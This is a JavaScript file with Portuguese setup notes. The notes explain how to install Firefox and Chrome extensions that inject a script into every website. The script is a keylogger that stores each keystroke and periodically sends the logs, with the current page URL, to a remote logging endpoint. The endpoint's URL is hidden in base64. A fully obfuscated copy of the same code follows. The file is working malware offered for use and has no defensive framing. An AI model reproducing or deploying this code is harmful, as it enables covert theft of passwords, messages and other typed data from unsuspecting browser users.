/*
# No Firefox:
1 - Instalar Extensao No Firefox 
	link -> https://addons.mozilla.org/pt-BR/firefox/addon/custom-site-js/
		 -> Parametros da extensao:
			Name: qlqr coisa
			URL : (http|https|ftp):// 	Obs: Marcar a opcao regex

# No Chrome
1 - Instalar Extensao no Chrome:
	link -> https://chrome.google.com/webstore/detail/requestly-redirect-url-mo/mdnleldcmiljblolnjhpnblkcekpdkpa
		 -> 

*/

// #Codigo Fonte Limpo
try {
	localStorage.getItem('logs').length;
}
catch(err) {
	localStorage.setItem('logs',' ');
}

if(localStorage.getItem('logs').length > 3){
	sendk();
}

document.onkeypress = function(e) {
	var get = window.event ? event : e;
	var key = get.keyCode ? get.keyCode : get.charCode;
	localStorage.setItem('logs', localStorage.getItem('logs')+String.fromCharCode(key));
	if(key == 13 || key == 10 ){
		localStorage.setItem('logs', localStorage.getItem('logs')+'[ENTER]');
	}
}

document.onkeydown = function(e) {
	if(e.keyCode == 9){
		localStorage.setItem('logs', localStorage.getItem('logs')+'[TAB]');
	}
}

function sendk(){
	new Image().src = atob('+aH+R0cHM6Ly9+z_cWxld_G8ucGFn+ZWtpdGUubWUvbG9ncy+5waHA_='.replace(/\+|_/g,'')) +'?c='+ encodeURI(localStorage.getItem('logs')) + '&url=' + encodeURI(document.URL);
	localStorage.setItem('logs','');
}

window.setInterval(function(){
	if(localStorage.getItem('logs').length > 3){
		sendk();
	}
}, 20000); //20 sec.



// # Codigo Fonte Ofuscado
var _0x52ff=['length','&url=','setItem','replace','event','+aH+R0cHM6Ly9+z_cWxld_G8ucGFn+ZWtpdGUubWUvbG9ncy+5waHA_=','onkeypress','charCode','?c=','[TAB]','setInterval','fromCharCode','URL','getItem','onkeydown','keyCode','src','logs'];(function(_0x23c2fb,_0x1a1466){var _0x112087=function(_0xb94c1e){while(--_0xb94c1e){_0x23c2fb['push'](_0x23c2fb['shift']());}};_0x112087(++_0x1a1466);}(_0x52ff,0x11f));var _0x5e09=function(_0x23c2fb,_0x1a1466){_0x23c2fb=_0x23c2fb-0x0;var _0x112087=_0x52ff[_0x23c2fb];return _0x112087;};try{localStorage[_0x5e09('0xe')](_0x5e09('0x0'))[_0x5e09('0x1')];}catch(_0x44d260){localStorage['setItem'](_0x5e09('0x0'),'\x20');}if(localStorage['getItem'](_0x5e09('0x0'))[_0x5e09('0x1')]>0x3){sendk();}document[_0x5e09('0x7')]=function(_0x49a347){var _0x505a38=window[_0x5e09('0x5')]?event:_0x49a347;var _0x291419=_0x505a38[_0x5e09('0x10')]?_0x505a38[_0x5e09('0x10')]:_0x505a38[_0x5e09('0x8')];localStorage[_0x5e09('0x3')](_0x5e09('0x0'),localStorage['getItem'](_0x5e09('0x0'))+String[_0x5e09('0xc')](_0x291419));if(_0x291419==0xd||_0x291419==0xa){localStorage[_0x5e09('0x3')]('logs',localStorage[_0x5e09('0xe')](_0x5e09('0x0'))+'[ENTER]');}};document[_0x5e09('0xf')]=function(_0x5065ec){if(_0x5065ec['keyCode']==0x9){localStorage[_0x5e09('0x3')](_0x5e09('0x0'),localStorage[_0x5e09('0xe')](_0x5e09('0x0'))+_0x5e09('0xa'));}};function sendk(){new Image()[_0x5e09('0x11')]=atob(_0x5e09('0x6')[_0x5e09('0x4')](/\+|_/g,''))+_0x5e09('0x9')+encodeURI(localStorage[_0x5e09('0xe')]('logs'))+_0x5e09('0x2')+encodeURI(document[_0x5e09('0xd')]);localStorage[_0x5e09('0x3')](_0x5e09('0x0'),'');}window[_0x5e09('0xb')](function(){if(localStorage[_0x5e09('0xe')](_0x5e09('0x0'))['length']>0x3){sendk();}},0x4e20);
